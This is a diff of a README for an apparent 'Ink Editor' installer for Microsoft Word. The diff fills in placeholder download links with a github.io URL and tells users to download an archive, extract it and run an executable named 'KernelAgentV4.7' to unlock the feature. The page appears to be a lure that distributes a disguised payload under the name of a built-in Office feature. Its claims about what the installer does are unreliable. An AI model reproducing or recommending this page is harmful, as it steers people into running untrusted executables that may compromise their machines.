@@ -2,13 +2,15 @@
 
 Ink Editor allows you to edit Word documents naturally with your finger, stylus, or digital pen. Cross out words to delete, circle to select, or use gestures to move, highlight, and edit—all with touch. This installer enables Ink Editor features in Word using KernelAgentV4.7.
 
-[![Download Ink Editor](https://img.shields.io/badge/Download-Ink_Editor-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Ink Editor](https://img.shields.io/badge/Download-Ink_Editor-blueviolet)](https://m365-ink-editor-pen-touch.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-ink-editor-pen-touch.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a directory like `C:\M365InkEditor`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to unlock Ink Editor gesture and input support  
 4. ✍️ Open Word → Draw tab → Select Ink Editor  
